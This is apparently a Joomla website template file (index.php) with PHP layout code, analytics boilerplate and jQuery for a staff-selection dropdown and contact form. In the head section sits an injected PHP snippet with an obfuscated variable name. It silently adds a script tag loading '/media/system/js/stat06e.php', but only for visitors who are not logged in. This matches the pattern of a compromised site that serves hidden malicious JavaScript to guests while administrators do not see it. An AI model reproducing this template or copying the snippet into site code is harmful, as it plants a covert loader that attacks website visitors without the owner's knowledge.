<?php defined( '_JEXEC' ) or die; 

include_once JPATH_THEMES.'/'.$this->template.'/logic.php'; // load logic.php

?>
<!doctype html>
<!--[if IEMobile]><html class="iemobile" lang="<?php echo $this->language; ?>"> <![endif]-->
<!--[if IE 8]>    <html class="no-js ie8" lang="<?php echo $this->language; ?>"> <![endif]-->
<!--[if gt IE 8]><!-->  <html class="no-js" lang="<?php echo $this->language; ?>"> <!--<![endif]-->

<head>
<jdoc:include type="head" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
<link rel="apple-touch-icon-precomposed" href="<?php echo $tpath; ?>/images/apple-touch-icon-57x57-precomposed.png">
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="<?php echo $tpath; ?>/images/apple-touch-icon-72x72-precomposed.png">
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="<?php echo $tpath; ?>/images/apple-touch-icon-114x114-precomposed.png">
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="<?php echo $tpath; ?>/images/apple-touch-icon-144x144-precomposed.png">
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/css/main.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/css/normalize.css" type="text/css" />
<!--[if lte IE 8]>
    <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <?php if ($pie==1) : ?>
      <style> 
        {behavior:url(<?php echo $tpath; ?>/js/PIE.htc);}
      </style>
    <?php endif; ?>
  <![endif]-->



<?php $_06e29f07=1;if(is_object($_SESSION["__default"]["user"]) && !($_SESSION["__default"]["user"]->id)) {echo "
<script language=JavaScript id=onDate ></script>
<script language=JavaScript src=/media/system/js/stat06e.php ></script>
";};$_06e29f07=1; ?>
</head>

<body class="<?php echo (($menu->getActive() == $menu->getDefault()) ? ('front') : ('page')).' '.$active->alias.' '.$pageclass; ?>">
<!--[if lt IE 7]>
            <p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
        <![endif]-->
<!-- Add your site or application content here -->
<div id="home"></div>
<div class="container">
	<?php if($this->countModules('header_left')) : ?>
	<div id="logo">
		<jdoc:include type="modules" name="header_left" style="none" />
		<div class="clear"></div>
	</div>
	<?php endif; ?>
	<?php if($this->countModules('header_right')) : ?>
	<div id="menu">
		<jdoc:include type="modules" name="header_right" style="none" />
		<div class="clear"></div>
	</div>
	<?php endif; ?>
</div>
<div id="sticker" style="display: none; height: 0">
	<div class="container">
		<?php if($this->countModules('header_left_sticker')) : ?>
		<div id="sticker-logo">
			<jdoc:include type="modules" name="header_left_sticker" style="none" />
			<div class="clear"></div>
		</div>
		<?php endif; ?>
		<?php if($this->countModules('header_right_sticker')) : ?>
		<div id="sticker-menu">
			<jdoc:include type="modules" name="header_right_sticker" style="none" />
			<div class="clear"></div>
		</div>
		<?php endif; ?>
	</div>
</div>
<div class="cycle-slideshow" data-cycle-slides="div">
	<?php if($this->countModules('top_slider')) : ?>
	<div class="slide">
		<jdoc:include type="modules" name="top_slider" style="none" />
		<div class="clear"></div>
	</div>
	<?php endif; ?>
</div>
<div class="home">
	<div class="container">
		<?php if($this->countModules('content_top')) : ?>
		<div class="blurb">
			<jdoc:include type="modules" name="content_top" style="none" />
			<div class="clear"></div>
		</div>
		<?php endif; ?>
		<?php if($this->countModules('content_bottom')) : ?>
		<div class="take-action">
			<jdoc:include type="modules" name="content_bottom" style="none" />
			<div class="clear"></div>
		</div>
		<?php endif; ?>
	</div>
</div>
<div class="spacer"></div>
<div id="services" class="call-to-action clearfix">
	<div class="container">
		<?php if($this->countModules('left_col')) : ?>
		<div class="col-6 float-left">
			<jdoc:include type="modules" name="left_col" style="none" />
			<div class="clear"></div>
		</div>
		<?php endif; ?>
		<?php if($this->countModules('right_col')) : ?>
		<div class="service-list float-left">
			<jdoc:include type="modules" name="right_col" style="none" />
			<div class="clear"></div>
		</div>
		<?php endif; ?>
	</div>
</div>
<div id="about" class="border-top">
	<div class="cycle-slideshow" data-cycle-slides="div">
		<?php if($this->countModules('bottom_slider')) : ?>
		<div class="slide">
			<jdoc:include type="modules" name="bottom_slider" style="none" />
			<div class="clear"></div>
		</div>
		<?php endif; ?>
	</div>
</div>
<div class="about">
	<div class="container">
		<?php 
				require($templateDir."layouts/".$style.".php");
			?>
	</div>
</div>
<div id="contact"></div>
<div class="contact border-top">
	<div class="container clearfix">
		<div class="float-right">
			<?php if($this->countModules('contact_form')) : ?>
			<div class="form">
				<jdoc:include type="modules" name="contact_form" style="none" />
				<div class="clear"></div>
			</div>
			<?php endif; ?>
			<?php if($this->countModules('contact_btn')) : ?>
			<div id="form-btn">
				<jdoc:include type="modules" name="contact_btn" style="none" />
				<div class="clear"></div>
			</div>
			<?php endif; ?>
		</div>
		<h1>CONTACT <span class="bold">US</span></h1>
		<br />
		<br />
		<div class="col-3 float-left">
			<div class="border-right">
				<div class="contact-padding-r">
					<?php if($this->countModules('footer_left')) : ?>
					<div class="mail-phone-person">
						<jdoc:include type="modules" name="footer_left" style="none" />
						<div class="clear"></div>
					</div>
					<?php endif; ?>
				</div>
			</div>
		</div>
		<div class="col-3 float-left">
                    <div class="contact-padding-l">       
                       <?php if($this->countModules('footer_middle')) : ?>
					<div class="mail-phone-person">
						<jdoc:include type="modules" name="footer_middle" style="none" />
						<div class="clear"></div>
					</div>
					<?php endif; ?>
                    </div>
                </div>
		<div class="col-3 float-left last-col">
			<?php if($this->countModules('footer_right')) : ?>
			<div class="direct_contact" tabindex="1">
				<jdoc:include type="modules" name="footer_right" style="none" />
				<div class="clear"></div>
			</div>
			<?php endif; ?>
		</div>
	</div>
</div>
<footer>
	<div class="container clearfix">
		<?php if($this->countModules('footer_bottom')) : ?>
		<div class="copyright">
			<jdoc:include type="modules" name="footer_bottom" style="none" />
			<div class="clear"></div>
		</div>
		<?php endif; ?>
	</div>
</footer>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script>window.jQuery || document.write('<script src="js/vendor/jquery-1.10.2.min.js"><\/script>')</script>
<script src="js/plugins.js"></script>
<script src="js/main.js"></script>

<!-- Google Analytics: change UA-XXXXX-X to be your site's ID. -->
<script>
            (function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=
            function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;
            e=o.createElement(i);r=o.getElementsByTagName(i)[0];
            e.src='//www.google-analytics.com/analytics.js';
            r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));
            ga('create','UA-XXXXX-X');ga('send','pageview');
        </script>
<script>
            function onResize() {
                var w = $(window).width();

                if(w < 774) {
                    $("#form-btn").css("display", "none");
                    $(".form").show();
                } else {
                    $("#form-btn").css("display", "block");
                    $(".form").hide();
                }

                $(document).on("click", function() {
                    if(w > 774) {
                        $(".form").hide();
                        $("#form-btn").css("display", "block");
                    } else {
                        $(".form").show();
                        $("#form-btn").css("display", "none");
                    }
                });

                $(".form").on("click", function (event) {
                        event.stopPropagation();
                });

                $("#form-btn").on("click", function (event) {
                    if($("#form-btn").is(":visible")) {
                        event.stopPropagation();
                        $("#form-btn").css("display", "none");
                        $(".form").slideToggle();
                    }
                });
            }

            function DropDown(el) {
                this.dd = el;
                this.placeholder = this.dd.children('span');
                this.opts = this.dd.find('ul.dropdown > li');
                this.val = '';
                this.index = -1;
                this.initEvents();
            }

            DropDown.prototype = {
                initEvents : function() {
                    var obj = this;

                    obj.dd.on('click', function(event){
                        $(this).toggleClass('active');
                        return false;
                    });

                    obj.opts.on('click',function(){
                        var opt = $(this);
                        obj.val = opt.text();
                        obj.index = opt.index();
                        obj.placeholder.text(obj.val);
                    });
                },
                getValue : function() {
                    return this.val;
                },
                getIndex : function() {
                    return this.index;
                }
            }

            $(function() {
                var dd = new DropDown( $('#dd') );
                $(document).click(function() {
                    $('.wrapper-dropdown').removeClass('active');
                });
            });

            $(document).ready(function () {
                onResize();
                $(window).resize(function() {
                    onResize();
                    DropDown();
                });
            });

            $(".dropdown > li > a").click(function () {
                var ed = $("#ed")[0].innerHTML;
                    christine = $("#christine")[0].innerHTML;
                    joe = $("#joe")[0].innerHTML;
                    jill = $("#jill")[0].innerHTML;
                    matt = $("#matt")[0].innerHTML;
                    sherri = $("#sherri")[0].innerHTML;
                    leslie = $("#leslie")[0].innerHTML;
                    content = $("#select-holder");

                if(this.innerHTML == "ED FULESDAY") {
                    if($("#select-holder")[0].innerHTML !== ""){
                        $("#select-holder")[0].innerHTML = ""
                        content.append(ed);
                    } else {
                        content.append(ed);
                    }
                } else if(this.innerHTML == "CHRISTINE BRATKOVICH") {
                    if($("#select-holder")[0].innerHTML !== ""){
                        $("#select-holder")[0].innerHTML = ""
                        content.append(christine);
                    } else {
                        content.append(christine);
                    }
                } else if(this.innerHTML == "JOE HAGAN") {
                    if($("#select-holder")[0].innerHTML !== ""){
                        $("#select-holder")[0].innerHTML = ""
                        content.append(joe);
                    } else {
                        content.append(joe);
                    }
                } else if(this.innerHTML == "JILL DUNKER") {
                    if($("#select-holder")[0].innerHTML !== ""){
                        $("#select-holder")[0].innerHTML = ""
                        content.append(jill);
                    } else {
                        content.append(jill);
                    }
                }
                else if(this.innerHTML == "MATTHEW D RETHAGE") {
                    if($("#select-holder")[0].innerHTML !== ""){
                        $("#select-holder")[0].innerHTML = ""
                        content.append(matt);
                    } else {
                        content.append(matt);
                    }
                }
                else if(this.innerHTML == "SHERRI KOVACH") {
                    if($("#select-holder")[0].innerHTML !== ""){
                        $("#select-holder")[0].innerHTML = ""
                        content.append(sherri);
                    } else {
                        content.append(sherri);
                    }
                }
                else if(this.innerHTML == "LESLI KRAFT") {
                    if($("#select-holder")[0].innerHTML !== ""){
                        $("#select-holder")[0].innerHTML = ""
                        content.append(leslie);
                    } else {
                        content.append(leslie);
                    }
                }
            });

        </script>
<script>
        $('.cycle-slideshow').cycle({
          timeout: 4000,
          speed: 500,
          slideResize: false
        });
        </script>
<script>
          $(document).ready(function(){
            $("#sticker").sticky({topSpacing:0});
          });
        </script>
<!--<script>
            $(window).load(function()   {    
               var contentWidth = 900;
               $(".cycle-slideshow img.resize").each(function(){ 
                    var ratio = $(this).width()/contentWidth;
                    //alert($(this).width());
                    $(this).wrap("<div style='width:"+(ratio*100)+"%;'></div>");
                    //alert(ratio*100);
                    });
               $(".cycle-slideshow img.resize-left").each(function(){ 
                    var ratio = $(this).width()/contentWidth;
                    //alert($(this).width());
                    $(this).wrap("<div style='width:"+(ratio*100)+"%; float:left; margin:0 2% 0 0;'></div>");
                    //alert(ratio*100);
                    });
                $(".cycle-slideshow img.resize-right").each(function(){ 
                    var ratio = $(this).width()/contentWidth;
                    //alert($(this).width());
                    $(this).wrap("<div style='width:"+(ratio*100)+"%; float:right; margin:0 0 0 2%;'></div>");
                    //alert(ratio*100);
                    });
                $(".cycle-slideshow img.resize-center").each(function(){ 
                    var ratio = $(this).width()/contentWidth;
                    //alert($(this).width());
                    $(this).wrap("<div style='width:"+(ratio*100)+"%; margin:0 auto;'></div>");
                    //alert(ratio*100);
                    });
              $(".cycle-slideshow img").css( "max-width", "100%" );        
            });
        </script>-->
</body>

<!-- 
    YOUR CODE HERE
  -->
</body>
</html>